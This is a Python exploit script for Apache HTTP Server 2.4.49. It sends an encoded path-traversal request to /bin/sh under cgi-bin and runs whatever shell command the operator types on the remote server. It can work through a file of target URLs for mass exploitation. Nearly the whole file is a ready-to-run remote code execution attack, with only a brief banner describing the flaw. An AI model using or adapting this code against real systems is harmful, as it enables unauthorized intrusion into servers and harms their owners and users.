import argparse
import os
import sys
import requests
import urllib3

def disable_ssl_warnings():
    urllib3.disable_warnings()

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def arg_check():
    if len(sys.argv) <= 1:
        print('\n%s Please use -h for help.' % (sys.argv[0]))
        exit(0)

def exploit(url, timeout):
    struct_url = 'http://{}'.format(url)
    cmd = input("\033[1;36mEnter Your Command >>> \033[0m")

    if cmd != 'exit':
        url1 = f"http://{url}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" if 'https' not in struct_url else f"https://{url}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
        data = f"echo Content-Type: text/plain; echo; {cmd}"
        try:
            response = requests.post(url1, data=data, timeout=timeout)
            print(response.text, end='')
        except requests.RequestException as e:
            print(f"An error occurred: {e}")
    else:
        exit(0)

def main():
    disable_ssl_warnings()
    clear_terminal()
    arg_check()

    print("""
    #########################################################
    #                                                       #
    #      Apache2 2.4.49 - LFI & RCE Exploit               #
    #             Severity: Critical                        #
    #                                                       #
    #########################################################
    
    [$] Description:
    
    Apache HTTP Server 2.4.49 is vulnerable to Path Traversal and Remote Code execution attacks.
    https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013
    """)

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='URL to exploit')
    parser.add_argument('-f', '--file', help='File containing URLs')    
    parser.add_argument('-t', '--timeout', help='Maximum number of seconds to wait while requesting a web page (default: 10)', default=10, type=int)
    args = parser.parse_args()

    timeout = args.timeout

    if args.file:
        print("[#] Fetching URLs from file...")
        with open(args.file, "r") as f:
            urls = f.readlines()
            for url in urls:
                try:
                    if url.strip():
                        print(f"[#] Target: {url.strip()}")
                        exploit(url.strip(), timeout)
                except Exception as e:
                    print(f"An error occurred: {e}")
    elif args.url:
        print(f"[#] Target: {args.url}")
        exploit(args.url, timeout)

if __name__ == '__main__':
    main()
